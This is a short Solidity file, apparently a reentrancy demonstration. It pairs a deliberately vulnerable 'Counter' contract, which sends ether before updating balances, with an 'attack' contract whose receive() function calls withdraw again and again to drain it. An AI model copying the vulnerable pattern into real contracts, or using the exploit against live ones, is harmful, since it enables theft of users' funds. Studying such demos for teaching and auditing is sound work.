// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

contract Counter {
    uint256 public number;

    mapping(address => uint) balance;

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        // console2.log(msg.sender);
        if (balance[msg.sender] >= _amount) {
            msg.sender.call{value: _amount}("");
            balance[msg.sender] -= _amount;
        }
    }

    function withdraw() public {
        msg.sender.call{value: balance[msg.sender]}("");
        balance[msg.sender] = 0;
    }
}

contract attack {
    Counter C_;

    constructor(address _c) {
        C_ = Counter(_c);
    }

    function _startDeposit() external payable {
        C_.deposit{value: msg.value}();
    }

    function w() public {
        C_.withdraw(1 ether);
    }

    receive() external payable {
        if (address(C_).balance > 0) {
            C_.withdraw(msg.value);
        }
    }
}
